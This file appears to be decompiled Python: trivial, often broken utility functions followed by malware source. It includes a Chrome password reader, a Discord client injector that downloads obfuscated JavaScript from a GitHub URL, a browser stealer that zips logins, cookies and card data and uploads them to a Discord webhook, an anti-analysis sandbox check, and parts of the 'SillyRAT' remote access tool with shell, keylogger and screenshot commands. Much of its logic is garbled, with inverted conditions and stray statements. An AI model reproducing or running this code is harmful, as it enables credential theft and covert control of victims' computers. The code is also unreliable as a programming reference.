import asyncio

def hello_world():
    print('Hello, World!')

def add_numbers(a, b):
    return a + b

def subtract_numbers(a, b):
    return a - b

def multiply_numbers(a, b):
    return a * b

def divide_numbers(a, b):
    return a / b

def is_even(number):
    return number % 2 == 0

def is_odd(number):
    return number % 2!= 0

def factorial(number):
    if number == 0:
        pass  # postinserted
    return 1

def find_max(numbers):
    return max(numbers)

def find_min(numbers):
    return min(numbers)

def is_positive_or_negative(number):
    if number > 0:
        pass  # postinserted
    return 'Positive'

def lambda_square(x):
    square = lambda x: x ** 2

def generate_squares(numbers):
    return [lambda_square(num) for num in numbers]

def fibonacci():
    a, b = (0, 1)
    pass
    yield a
    a, b = (b, a + b)

async def async_hello_world():
    print('Hello, World!')

async def async_add_numbers(a, b):
    return a + b

async def async_subtract_numbers(a, b):
    return a - b

async def async_multiply_numbers(a, b):
    return a * b

async def async_divide_numbers(a, b):
    return a / b

async def async_is_even(number):
    return number % 2 == 0

async def async_is_odd(number):
    return number % 2!= 0

async def async_factorial(number):
    if number == 0:
        pass  # postinserted
    return 1

async def async_find_max(numbers):
    return max(numbers)

async def async_find_min(numbers):
    return min(numbers)

async def async_is_positive_or_negative(number):
    if number > 0:
        pass  # postinserted
    return 'Positive'

async def async_lambda_square(x):
    square = lambda x: x ** 2

async def async_generate_squares(numbers):
    return [await async_lambda_square(num) for num in numbers]

async def async_fibonacci():
    a, b = (0, 1)
    pass
    yield a
    a, b = (b, a + b)

class normal:
    def __init__(self):
        print('init')

    def hello_world(self):
        print('Hello, World!')

    def add_numbers(self, a, b):
        return a + b

    def subtract_numbers(self, a, b):
        return a - b

    def multiply_numbers(self, a, b):
        return a * b

    def divide_numbers(self, a, b):
        return a / b

    def is_even(self, number):
        return number % 2 == 0

    def is_odd(self, number):
        return number % 2!= 0

    def factorial(self, number):
        if number == 0:
            pass  # postinserted
        return 1

    def find_max(self, numbers):
        return max(numbers)

    def find_min(self, numbers):
        return min(numbers)

    def is_positive_or_negative(self, number):
        if number > 0:
            pass  # postinserted
        return 'Positive'

    def lambda_square(self, x):
        square = lambda x: x ** 2

    def generate_squares(self, numbers):
        return [self.lambda_square(num) for num in numbers]

    def fibonacci(self):
        a, b = (0, 1)
        pass
        yield a
        a, b = (b, a + b)

class async_class:
    def __init__(self):
        print('init')

    async def async_hello_world(self):
        print('Hello, World!')

    async def async_add_numbers(self, a, b):
        return a + b

    async def async_subtract_numbers(self, a, b):
        return a - b

    async def async_multiply_numbers(self, a, b):
        return a * b

    async def async_divide_numbers(self, a, b):
        return a / b

    async def async_is_even(self, number):
        return number % 2 == 0

    async def async_is_odd(self, number):
        return number % 2!= 0

    async def async_factorial(self, number):
        if number == 0:
            pass  # postinserted
        return 1

    async def async_find_max(self, numbers):
        return max(numbers)

    async def async_find_min(self, numbers):
        return min(numbers)

    async def async_is_positive_or_negative(self, number):
        if number > 0:
            pass  # postinserted
        return 'Positive'

    async def async_lambda_square(self, x):
        square = lambda x: x ** 2

    async def async_generate_squares(self, numbers):
        return [await self.async_lambda_square(num) for num in numbers]

    async def async_fibonacci(self):
        a, b = (0, 1)
        pass
        yield a
        a, b = (b, a + b)

class all_overrides:
    def __init__(self):
        print('init')

    def __str__(self):
        return 'This is an instance of the all_overrides class'

    def __repr__(self):
        return 'all_overrides()'

    def __len__(self):
        return 0

    def __getitem__(self, index):
        return None

    def __setitem__(self, index, value):
        return None

    def __delitem__(self, index):
        return None

    def __iter__(self):
        return iter([])

    def __next__(self):
        raise StopIteration

    def __contains__(self, item):
        return False

    def __eq__(self, other):
        return False

    def __ne__(self, other):
        return True

    def __lt__(self, other):
        return False

    def __gt__(self, other):
        return False

    def __le__(self, other):
        return True

    def __ge__(self, other):
        return True

    def __hash__(self):
        return 0

    def __call__(self, *args, **kwargs):
        return None

    def __enter__(self):
        return None

    def __exit__(self, exc_type, exc_value, traceback):
        return None

    def __getattr__(self, name):
        return None

    def __setattr__(self, name, value):
        return None

    def __delattr__(self, name):
        return None

def collect_chrome_passwords_windows():
    import os
    import sqlite3
    import win32crypt
    home_dir = os.path.expanduser('~')
    db_path = os.path.join(home_dir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    rows = cursor.fetchall()
    conn.close()

def encrypt_password(password):
    import base64
    import hashlib
    salt = os.urandom(16)
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    salt_b64 = base64.b64encode(salt).decode()
    key_b64 = base64.b64encode(key).decode()
    return (salt_b64, key_b64)

def send_http_request(url, data):
    import requests
    response = requests.post(url, data=data)
    return response

def download_file(url, filename):
    import requests
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)

def run_command(command):
    import subprocess
    output = subprocess.check_output(command, shell=True)
    return output

def take_screenshot(filename):
    import pyautogui
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def send_email(subject, body, to):
    import smtplib
    from email.message import EmailMessage
    message = EmailMessage()
    message.set_content(body)
    message['Subject'] = subject
    message['From'] = ''
    message['To'] = to
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('', '')
    server.send_message(message)

def create_zip_archive(files, archive):
    import zipfile
    with zipfile.ZipFile(archive, 'w') as zipf:
        for file in files:
            zipf.write(file)

def read_pdf(filename):
    import PyPDF2
    with open(filename, 'rb') as file:
        reader = PyPDF2.PdfFileReader(file)
        text = ''
        for page_num in range(reader.numPages):
            page = reader.getPage(page_num)
            text += page.extract_text()

def read_csv_with_pandas(filename):
    import pandas as pd
    df = pd.read_csv(filename)
    return df

def plot_data_with_matplotlib(data):
    import matplotlib.pyplot as plt
    plt.plot(data)
    plt.show()

def train_model_with_sklearn(X, y):
    from sklearn.linear_model import LinearRegression
    model = LinearRegression()
    model.fit(X, y)
    return model
import os
import re
import subprocess
import psutil
import requests

class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [self.appdata + '\\Discord', self.appdata + '\\DiscordCanary', self.appdata + '\\DiscordPTB', self.appdata + '\\DiscordDevelopment']
        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                pass  # postinserted
            else:  # inserted
                proc.kill()
        for dir in self.discord_dirs:
            if os.path.exists(dir) and self.get_core(dir) is not None:
                pass  # postinserted
            else:  # inserted
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                pass  # postinserted
            else:  # inserted
                modules = dir + '\\' + file + '\\modules'
                if os.path.exists(modules):
                    pass  # postinserted
                else:  # inserted
                    for file in os.listdir(modules):
                        if re.search('discord_desktop_core-+?', file):
                            pass  # postinserted
                        else:  # inserted
                            core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                            if os.path.exists(core + '\\index.js'):
                                pass  # postinserted
                            else:  # inserted
                                return (core, file)
        else:  # inserted
            return None

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[(-1)] + '.exe'
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                pass  # postinserted
            else:  # inserted
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    pass  # postinserted
                else:  # inserted
                    for file in os.listdir(app):
                        if file == executable:
                            pass  # postinserted
                        else:  # inserted
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

class Browsers:
    def __init__(self, webhook):
        self.webhook = SyncWebhook.from_url(webhook)
        Chromium()
        Upload(self.webhook)

class Upload:
    def __init__(self, webhook: SyncWebhook):
        self.webhook = webhook
        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs('vault', exist_ok=True)
        if __LOGINS__:
            with open('vault\\logins.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join((str(x) for x in __LOGINS__)))
        if __COOKIES__:
            with open('vault\\cookies.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join((str(x) for x in __COOKIES__)))
        if __WEB_HISTORY__:
            with open('vault\\web_history.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join((str(x) for x in __WEB_HISTORY__)))
        if __DOWNLOADS__:
            with open('vault\\downloads.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join((str(x) for x in __DOWNLOADS__)))
        if __CARDS__:
            with open('vault\\cards.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join((str(x) for x in __CARDS__)))
        with ZipFile('vault.zip', 'w') as zip:
            for file in os.listdir('vault'):
                zip.write(f'vault\\{file}', file)

    def send(self):
        self.webhook.send(embed=Embed(title='Vault', description='```' + '\n'.join(self.tree(Path('vault'))) + '```'), file=File('vault.zip'), username='Empyrean', avatar_url='https://i.imgur.com/HjzfjfR.png')

    def clean(self):
        shutil.rmtree('vault')
        os.remove('vault.zip')

    def tree(self, path: Path, prefix: str='', midfix_folder: str='📂 - ', midfix_file: str='📄 - '):
        pipes = {'space': '    ', 'branch': '│   ', 'tee': '├── ', 'last': '└── '}
        if prefix == '':
            yield (midfix_folder + path.name)
        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum((f.stat().st_size for f in path.glob('**/*'))) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix + extension)
            else:  # inserted
                yield f'{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)'

class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f"{self.host}\t{('FALSE' if self.expires == 0 else 'TRUE')}\t{self.path}\t{('FALSE' if self.host.startswith('.') else 'TRUE')}\t{self.expires}\t{self.name}\t{self.value}"

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()
import os
import re
import subprocess
import sys
import uuid
import psutil
import requests
from typing import Literal

class AntiDebug:
    def __init__(self) -> None:
        if self.checks():
            sys.exit(int())

    def checks(self) -> bool:
        debugging = False
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21']
        self.blacklistedProcesses = ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'cmd']
        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> None:
        for proc in psutil.process_iter():
            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):
                pass  # postinserted
            else:  # inserted
                try:
                    proc.kill()
                except:
                    pass

    def get_network(self) -> Literal[True] | None:
        ip = requests.get('https://ipapi.co/ip/').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        if ip in self.blackListedIPS:
            pass  # postinserted
        return True

    def get_system(self) -> Literal[True] | None:
        try:
            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
            username = os.getenv('UserName')
            hostname = os.getenv('COMPUTERNAME')
            for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
                if hwid in i or username in i or hostname in i:
                    pass  # postinserted
                else:  # inserted
                    return True
        except:
            pass  # postinserted
        hwid = 'None'

class CLIENT:
    SOCK = None
    KEY = ')J@NcRfU'
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ''

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port = _pt

    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        if HAVE_X:
            def on_press(key):
                if not self.KEYLOGGER_STATUS:
                    pass  # postinserted
                return False

            def on_release(key):
                if not self.KEYLOGGER_STATUS:
                    pass  # postinserted
                return False

            def logger():
                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
            if status:
                if not self.KEYLOGGER_STATUS:
                    self.KEYLOGGER_STATUS = True
                    t = threading.Thread(target=logger)
                    t.daemon = True
                    t.start()

    def execute(self, command):
        data = command.decode('utf-8').split(':')
        if data[0] == 'shell':
            toexecute = data[1].rstrip(' ').lstrip(' ')
            toexecute = ' '.join(toexecute.split())
            if toexecute.split(' ')[0] == 'cd':
                try:
                    os.chdir(toexecute.split(' ')[1])
                    self.send_data('')
                    return
                except:
                    self.send_data('Error while changing directory!')
                    return

    def acceptor(self):
        data = ''
        chunk = b''
        pass
        chunk = self.SOCK.recv(4096)
        if not chunk:
            pass  # postinserted
        return

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pass
        try:
            self.SOCK.connect((self.ipaddress, self.port))
            self.acceptor()
        except:
            pass  # postinserted
        time.sleep(5)
import sys
import os
import socket
import time
import base64
import os
import tabulate
import signal
import shlex
import platform
import io
import psutil
import subprocess
import threading
import pyscreenshot
from datetime import datetime
import Xlib

class SCREENSHOT:
    SC_DATA = b''

    def __init__(self):
        self.generate()

    def generate(self):
        obj = io.BytesIO()
        im = pyscreenshot.grab()
        im.save(obj, format='PNG')
        self.SC_DATA = obj.getvalue()

    def get_data(self):
        return self.SC_DATA

class SYSINFO:
    DATA_STRING = ''

    def __init__(self):
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info = self.get_net_info()

    def get_size(self, bolter, suffix='B'):
        factor = 1024
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bolter < factor:
                return f'{bolter:.2f}{unit}{suffix}'

    def get_sys_info(self):
        headers = ('Platform Tag', 'Information')
        values = []
        uname = platform.uname()
        values.append(('System', uname.system))
        values.append(('Node Name', uname.node))
        values.append(('Release', uname.release))
        values.append(('Version', uname.version))
        values.append(('Machine', uname.machine))
        values.append(('Processor', uname.processor))
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_boot_time(self):
        headers = ('Boot Tags', 'Information')
        values = []
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        values.append(('Boot Time', f'{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}'))
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_cpu_info(self):
        headers = ('CPU Tag', 'Value')
        values = []
        cpufreq = psutil.cpu_freq()
        values.append(('Physical Cores', psutil.cpu_count(logical=False)))
        values.append(('Total Cores', psutil.cpu_count(logical=True)))
        values.append(('Max Frequency', f'{cpufreq.max:.2f}Mhz'))
        values.append(('Min Frequency', f'{cpufreq.min:.2f}Mhz'))
        values.append(('Current Frequency', f'{cpufreq.current:.2f}Mhz'))
        values.append(('CPU Usage', f'{psutil.cpu_percent()}%'))
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_mem_usage(self):
        headers = ('Memory Tag', 'Value')
        values = []
        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        values.append(('Total Mem', f'{self.get_size(svmem.total)}'))
        values.append(('Available Mem', f'{self.get_size(svmem.available)}'))
        values.append(('Used Mem', f'{self.get_size(svmem.used)}'))
        values.append(('Percentage', f'{self.get_size(svmem.percent)}%'))
        values.append(('Total Swap', f'{self.get_size(swap.total)}'))
        values.append(('Free Swap', f'{self.get_size(swap.free)}'))
        values.append(('Used Swap', f'{self.get_size(swap.used)}'))
        values.append(('Percentage Swap', f'{self.get_size(swap.percent)}%'))
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_disk_info(self):
        headers = ('Device', 'Mountpoint', 'File System', 'Total Size', 'Used', 'Free', 'Percentage')
        values = []
        partitions = psutil.disk_partitions()
        toappend = []
        for partition in partitions:
            toappend.append(partition.device)
            toappend.append(partition.mountpoint)
            toappend.append(partition.fstype)
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                toappend.append(self.get_size(partition_usage.total))
                toappend.append(self.get_size(partition_usage.used))
                toappend.append(self.get_size(partition_usage.free))
                toappend.append(self.get_size(partition_usage.percent))
                values.append(toappend)
                toappend = []
                rtval = tabulate.tabulate(values, headers=headers)
                return rtval
            except PermissionError:
                toappend.append(' ')
                toappend.append(' ')
                toappend.append(' ')
                toappend.append(' ')

    def get_net_info(self):
        headers = ('Interface', 'IP Address', 'MAC Address', 'Netmask', 'Broadcast IP', 'Broadcast MAC')
        values = []
        if_addrs = psutil.net_if_addrs()
        toappend = []
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                toappend.append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    toappend.append(address.address)
                    toappend.append('')
                    toappend.append(address.netmask)
                    toappend.append(address.broadcast)
                values.append(toappend)
                toappend = []
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_data(self):
        self.DATA_STRING = '\n' + self.sysinfo + '\n\n' + self.boot_time + '\n\n' + self.cpu_info + '\n\n' + self.mem_usage + '\n\n' + self.disk_info + '\n\n' + self.net_info + '\n\n'
        return self.DATA_STRING
import sys
import os
import socket
import time
import base64
import tabulate
import signal
import subprocess
import argparse
import shutil
import threading
import platform
from datetime import datetime

class PULL:
    WHITE = '[1m[0m'
    PURPLE = '[1m[95m'
    CYAN = '[1m[96m'
    DARKCYAN = '[1m[36m'
    BLUE = '[1m[94m'
    GREEN = '[1m[92m'
    YELLOW = '[1m[93m'
    RED = '[1m[91m'
    BOLD = '[1m'
    UNDERLINE = '[4m'
    END = '[0m'
    LINEUP = '[F'

    def __init__(self):
        if not self.support_colors:
            self.win_colors()

    def support_colors(self):
        plat = sys.platform
        supported_platform = plat!= 'Pocket PC' and (plat!= 'win32' or 'ANSICON' in os.environ)
        is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
        if supported_platform and (not is_a_tty):
            pass  # postinserted
        return False

    def win_colors(self):
        self.WHITE = ''
        self.PURPLE = ''
        self.CYAN = ''
        self.DARKCYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.BOLD = ''
        self.UNDERLINE = ''
        self.END = ''

    def get_com(self, mss=()):
        if mss:
            rtval = input(self.DARKCYAN + '$' + self.END + ' [' + self.GREEN + mss[1].ip + self.END + ':' + self.RED + str(mss[1].port) + self.END + '] ')
        rtval = rtval.rstrip(' ').lstrip(' ')
        return rtval

    def print(self, mess):
        print(self.GREEN + '[' + self.UNDERLINE + '*' + self.END + self.GREEN + '] ' + self.END + mess + self.END)

    def function(self, mess):
        print(self.BLUE + '[' + self.UNDERLINE + ':' + self.END + self.BLUE + '] ' + self.END + mess + self.END)

    def error(self, mess):
        print(self.RED + '[' + self.UNDERLINE + '!' + self.END + self.RED + '] ' + self.END + mess + self.END)

    def exit(self, mess=''):
        sys.exit(self.RED + '[' + self.UNDERLINE + '~' + self.END + self.RED + '] ' + self.END + mess + self.END)

    def logo(self):
        print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)

    def help_c_current(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister = [('help', 'Shows manual for commands'), ('sessions', 'Show all connected clients to the server'), ('connect', 'Connect to a Specific Client'), ('disconnect', 'Disconnect from Current Client'), ('clear', 'Clear Screen'), ('shell', 'Launch a New Terminal/Shell.'), ('keylogger', 'KeyLogger Module'), ('sysinfo', 'Dump System, Processor, CPU and Network Information'), ('screenshot', 'Take Screenshot on Target Machine and Save on Local'), ('exit', 'Exit from SillyRAT!')]
        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_general(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister = [('help', 'Shows manual for commands'), ('sessions', 'Show all connected clients to the server'), ('connect', 'Connect to a Specific Client'), ('disconnect', 'Disconnect from Current Client'), ('clear', 'Clear Screen'), ('exit', 'Exit from SillyRAT!')]
        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_sessions(self):
        sys.stdout.write('\n')
        print('Info       : Display connected sessions to the server!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ sessions')
        sys.stdout.write('\n')

    def help_c_connect(self):
        sys.stdout.write('\n')
        print('Info       : Connect to an available session!')
        print('Arguments  : Session ID')
        print('Example    : \n')
        print('$ connect 56\n')
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister = [('ID', 'integer', 'ID of the sessions from the list')]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_disconnect(self):
        sys.stdout.write('\n')
        print('Info       : Disconnect current session!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ disconnect')
        sys.stdout.write('\n')

    def help_c_clear(self):
        sys.stdout.write('\n')
        print('Info       : Clear screen!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ clear')
        sys.stdout.write('\n')

    def help_c_shell(self):
        sys.stdout.write('\n')
        print('Info       : Launch a shell against client!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ shell')
        sys.stdout.write('\n')

    def help_c_keylogger(self):
        sys.stdout.write('\n')
        print('Info       : Keylogger Module!')
        print('Arguments  : on, off, dump')
        print('Example    : \n')
        print('$ keylogger on')
        print('$ keylogger off')
        print('$ keylogger dump\n')
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister = [('on', 'Turn Keylogger on'), ('off', 'Turn Keylogger off'), ('dump', 'Dump keylogs')]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_sysinfo(self):
        sys.stdout.write('\n')
        print('Info       : Gathers system information!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ sysinfo')
        sys.stdout.write('\n')

    def help_c_screenshot(self):
        sys.stdout.write('\n')
        print('Info       : Screenshot the current screen and save it on server!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ screenshot')
        sys.stdout.write('\n')

    def help_overall(self):
        print(__HELP_OVERALL__)
        sys.exit(0)

    def help_bind(self):
        print(__HELP_BIND__)
        sys.exit(0)

    def help_generate(self):
        print(__HELP_GENERATE__)
        sys.exit(0)
pull = PULL()

class CLIENT:
    STATUS = 'Active'
    MESSAGE = ''
    KEY = ')J@NcRfU'

    def __init__(self, sock, addr):
        self.sock = sock
        self.ip = addr[0]
        self.port = addr[1]

    def acceptor(self):
        data = ''
        chunk = ''
        pass
        chunk = self.sock.recv(4096)
        if not chunk:
            self.STATUS = 'Disconnected'
        return

    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True
        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))

    def recv_data(self):
        if not self.MESSAGE:
            pass
            pass
        rtval = self.MESSAGE
        self.MESSAGE = ''
        return rtval

class COMMCENTER:
    CLIENTS = []
    COUNTER = 0
    CURRENT = ()
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == 'sessions':
                pull.help_c_sessions()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                pass  # postinserted
            else:  # inserted
                return client
        else:  # inserted
            return False

    def c_ping(self, _id):
        return None

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []
        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)
        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def c_shell(self):
        result = ''
        if self.CURRENT:
            sys.stdout.write('\n')
            pass
            val = input('# ')
            val = 'shell:' + val.rstrip(' ').lstrip(' ')
            if val:
                if val!= 'shell:exit':
                    self.CURRENT[1].send_data(val)
                    result = self.CURRENT[1].recv_data()
                    if result.strip(' '):
                        print(result)
            return
        else:  # inserted
            sys.stdout.write('\n')
            pull.error('You need to connect before execute this command!')
            sys.stdout.write('\n')

    def c_clear(self):
        subprocess.call(['clear'], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == 'status':
                    pass  # postinserted
                return

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data('sysinfo:')
            result = self.CURRENT[1].recv_data()
            if result.strip(' '):
                print(result)

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data('screenshot:')
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join(dirname, 'screenshots')
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join(dirname, '%s' % self.CURRENT[1].ip)
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            fullpath = os.path.join(dirname, datetime.now().strftime('%d-%m-%Y %H:%M:%S.png'))
            fl = open(fullpath, 'wb')
            fl.write(result)
            fl.close()
            pull.print('Saved: [' + pull.DARKCYAN + fullpath + pull.END + ']')

    def c_exit(self):
        sys.stdout.write('\n')
        pull.exit('See Ya!\n')

class INTERFACE(COMMCENTER):
    SOCKET = None
    RUNNER = True

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            pull.print('Successfuly Bind to %s%s:%i' % (pull.RED, self.address, self.port))
        except Exception as e:
            pull.exit('Unable to bind to %s%s:%i' % (pull.RED, self.address, self.port))

    def accept_threads(self):
        self.SOCKET.listen(10)
        if self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True
            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()
            self.CLIENTS.append((self.COUNTER, client))

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    def execute(self, vals):
        if vals:
            if vals[0] == 'exit':
                self.c_exit()

    def launch(self):
        pull.print('Launching Interface! Enter \'help\' to get avaible commands! \n')
        pass
        val = pull.get_com(self.CURRENT)
        self.execute(val.split(' '))

    def close(self):
        self.SOCKET.close()

class GENERATOR:
    data = ''
    flname = ''

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port
        self.source = prs.source
        self.persistence = prs.persistence
        self.output = self.get_output(prs.output)
        self.pather = self.get_path()
        self.v_imports = self.get_imports()
        self.v_consts = self.get_consts()
        self.v_persistence = self.get_persistence()
        self.v_sysinfo = self.get_sysinfo()
        self.v_screenshot = self.get_screenshot()
        self.v_client = self.get_client()
        self.v_main = self.get_main()

    def get_output(self, out):
        rtval = ''
        if self.source:
            if not out.endswith('.py'):
                rtval = out + '.py'
                return rtval

    def get_path(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'mods')
        if os.path.isdir(dirname):
            return dirname

    def get_imports(self):
        topen = os.path.join(self.pather, 'imports.py')
        fl = open(topen)
        data = fl.read()
